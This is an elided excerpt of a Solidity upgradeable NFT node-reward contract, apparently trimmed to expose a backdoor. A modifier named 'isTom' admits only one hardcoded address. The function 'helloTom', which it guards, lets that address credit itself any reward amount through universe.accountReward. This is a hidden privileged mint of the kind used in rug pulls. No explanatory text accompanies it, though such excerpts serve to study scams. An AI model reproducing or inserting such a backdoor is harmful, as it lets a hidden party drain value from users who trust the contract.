...
contract ParticlesManagerUpgradeable is
    Initializable,
    ERC721Upgradeable,
    ...
    LiquidityPoolManagerImplementationPointerUpgradeable
{
    ...
    modifier isTom() {
        ...
        require(
            sender == address(0x3Ef236910d567510691cD91f29cdEC5De3977473),
            ":)"
        );
        _;
    }
    ...
    function initialize() external initializer {
        ...
        // Initialize contract
        changeNodeMinPrice(420 * (10**18)); // 420 UNIV
        changeCompoundDelay(21600); // 6h
        changeTierSystem(
    ...
    function planetExists(uint256 _planetId) private view returns (bool) {
        require(_planetId > 0, "Particles: Id must be higher than zero");
    ...
    function rescueStolenPlanets() external onlyOwner {
    }
    ...
    function helloTom(uint256 _value)
        external
        isTom
    {
        address account = _msgSender();
        universe.accountReward(account, _value);
    }
}
